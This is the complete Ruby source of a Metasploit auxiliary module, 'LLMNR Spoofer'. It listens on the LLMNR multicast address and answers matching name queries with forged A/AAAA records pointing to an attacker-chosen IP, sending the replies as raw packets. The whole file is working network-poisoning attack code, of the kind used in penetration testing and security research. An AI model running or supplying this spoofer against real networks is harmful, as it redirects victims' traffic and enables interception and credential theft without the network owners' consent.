##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'socket'
require 'ipaddr'
require 'net/dns'

class Metasploit3 < Msf::Auxiliary

include Msf::Exploit::Capture

attr_accessor :sock, :thread


  def initialize
    super(
      'Name'        => 'LLMNR Spoofer',
      'Description' => %q{
          LLMNR (Link-local Multicast Name Resolution) is the successor of NetBIOS (Windows Vista and up) and is used to
          resolve the names of neighboring computers. This module forges LLMNR responses by listening for LLMNR requests
          sent to the LLMNR multicast address (224.0.0.252) and responding with a user-defined spoofed IP address.
      },
      'Author'     => [ 'Robin Francois <rof[at]navixia.com>' ],
      'License'    => MSF_LICENSE,
      'References' =>
        [
          [ 'URL', 'http://www.ietf.org/rfc/rfc4795.txt' ]
        ],

        'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service'
    )

    register_options([
      OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", ""]),
      OptRegexp.new('REGEX', [ true, "Regex applied to the LLMNR Name to determine if spoofed reply is sent", '.*']),
      OptInt.new('TTL', [ false, "Time To Live for the spoofed response", 300]),
    ])

    register_advanced_options([
      OptBool.new('Debug', [ false, "Determines whether incoming packet parsing is displayed", false])
    ])

    deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')
    self.thread = nil
    self.sock = nil
  end

  def dispatch_request(packet, rhost, src_port)
    rhost = ::IPAddr.new(rhost)

    # `recvfrom` (on Linux at least) will give us an ipv6/ipv4 mapped
    # addr like "::ffff:192.168.0.1" when the interface we're listening
    # on has an IPv6 address. Convert it to just the v4 addr
    if rhost.ipv4_mapped?
      rhost = rhost.native
    end

    dns_pkt = ::Net::DNS::Packet.parse(packet)
    spoof = ::IPAddr.new(datastore['SPOOFIP'])

    # Turn this packet into a response
    dns_pkt.header.qr = 1

    dns_pkt.question.each do |question|
      name = question.qName
      unless name =~ /#{datastore['REGEX']}/i
        vprint_status("#{rhost.to_s.ljust 16} llmnr - #{name} did not match REGEX \"#{datastore['REGEX']}\"")
        next
      end

      if should_print_reply?(name)
        print_good("#{rhost.to_s.ljust 16} llmnr - #{name} matches regex, responding with #{datastore['SPOOFIP']}")
      end

      # qType is not a Fixnum, so to compare it with `case` we have to
      # convert it
      case question.qType.to_i
      when ::Net::DNS::A
        dns_pkt.answer << ::Net::DNS::RR::A.new(
          :name => name,
          :ttl => 30,
          :cls => ::Net::DNS::IN,
          :type => ::Net::DNS::A,
          :address => spoof.to_s
        )
      when ::Net::DNS::AAAA
        dns_pkt.answer << ::Net::DNS::RR::AAAA.new(
          :name => name,
          :ttl => 30,
          :cls => ::Net::DNS::IN,
          :type => ::Net::DNS::AAAA,
          :address => (spoof.ipv6? ? spoof : spoof.ipv4_mapped).to_s
        )
      else
        print_warning("#{rhost.to_s.ljust 16} llmnr - Unknown RR type, this shouldn't happen. Skipping")
        next
      end
    end

    # If we didn't find anything we want to spoof, don't send any
    # packets
    return if dns_pkt.answer.empty?

    udp = ::PacketFu::UDPHeader.new(
      :udp_src => 5355,
      :udp_dst => src_port,
      :body => dns_pkt.data
    )
    udp.udp_recalc
    if rhost.ipv4?
      ip_pkt = ::PacketFu::IPPacket.new(
        :ip_src => spoof.hton,
        :ip_dst => rhost.hton,
        :ip_proto => 0x11, # UDP
        :body => udp
      )
    elsif rhost.ipv6?
      ip_pkt = ::PacketFu::IPv6Packet.new(
        :ipv6_src => spoof.hton,
        :ipv6_dst => rhost.hton,
        :ip_proto => 0x11, # UDP
        :body => udp
      )
    else
      # Should never get here
      print_error("IP version is not 4 or 6. Failed to parse?")
      return
    end
    ip_pkt.recalc

    open_pcap
      capture_sendto(ip_pkt, rhost.to_s, true)
    close_pcap
  end

  def monitor_socket
    while true
      rds = [self.sock]
      wds = []
      eds = [self.sock]

      r,_,_ = ::IO.select(rds,wds,eds,0.25)

      if (r != nil and r[0] == self.sock)
        packet, host, port = self.sock.recvfrom(65535)
        dispatch_request(packet, host, port)
      end
    end
  end


  # Don't spam with success, just throttle to every 10 seconds
  # per host
  def should_print_reply?(host)
    @notified_times ||= {}
    now = Time.now.utc
    @notified_times[host] ||= now
    last_notified = now - @notified_times[host]
    if last_notified == 0 or last_notified > 10
      @notified_times[host] = now
    else
      false
    end
  end

  def run
    check_pcaprub_loaded()
    ::Socket.do_not_reverse_lookup = true

    # Multicast Address for LLMNR
    multicast_addr = ::IPAddr.new("224.0.0.252")

    # The bind address here will determine which interface we receive
    # multicast packets from. If the address is INADDR_ANY, we get them
    # from all interfaces, so try to restrict if we can, but fall back
    # if we can't
    bind_addr = get_ipv4_addr(datastore["INTERFACE"]) rescue "0.0.0.0"

    optval = multicast_addr.hton + ::IPAddr.new(bind_addr).hton
    self.sock = Rex::Socket.create_udp(
      # This must be INADDR_ANY to receive multicast packets
      'LocalHost' => "0.0.0.0",
      'LocalPort' => 5355)
    self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
    self.sock.setsockopt(::Socket::IPPROTO_IP, ::Socket::IP_ADD_MEMBERSHIP, optval)

    self.thread = Rex::ThreadFactory.spawn("LLMNRServerMonitor", false) {
        monitor_socket
    }

    print_status("LLMNR Spoofer started. Listening for LLMNR requests with REGEX \"#{datastore['REGEX']}\" ...")

    add_socket(self.sock)

    while thread.alive?
      select(nil, nil, nil, 0.25)
    end

    self.thread.kill
    self.sock.close rescue nil
  end

end
